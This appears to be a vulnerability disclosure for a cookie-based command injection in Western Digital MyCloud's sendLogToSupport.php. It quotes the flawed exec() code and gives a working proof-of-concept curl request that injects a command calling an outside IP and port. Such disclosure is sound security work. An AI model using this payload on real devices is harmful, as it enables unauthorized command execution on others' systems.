## Western Digital MyCloud Remote Command Injection in sendLogToSupport.php

#### The latest firmware download link:https://downloads.wdc.com/nas/My_Cloud_GLCR_2.42.115.bin

### Description

#### /web/php/sendLogToSupport.php

A remote command execution vulnerability exists in the "php/sendLogToSupport.php" script within the Western Digital MyCloud <=v2.42.115  web interface.

##### Remote Command Execution

The "php/sendLogToSupport.php" file is vulnerable to a remote command execution bug allowing for a logged in user to execute commands. The following code illustrates the vulnerability.

`php/sendLogToSupport.php`

```
 15 $username = $\_COOKIE\['username'\];
 16 exec("wto -n \\"$username\\" -g", $ret);
```

On line 15 the value of the "username" cookie is pulled into a local variable. In the next line the value is used in an exec() call.

**POC**

```
http://host/web/php/sendLogToSupport.php?cmd=send_log&dev=a

Cookie: isAdmin=1;username=%24(your command)


curl -i "http://host/web/php/sendLogToSupport.php?cmd=send_log&dev=a" --cookie "isAdmin=1;username=%24(curl%20http:%2F%2F8.138.152.157:2333)"
```



![image-20250528150420738](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505281504114.png)



![image-20250528151725050](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505281517432.png)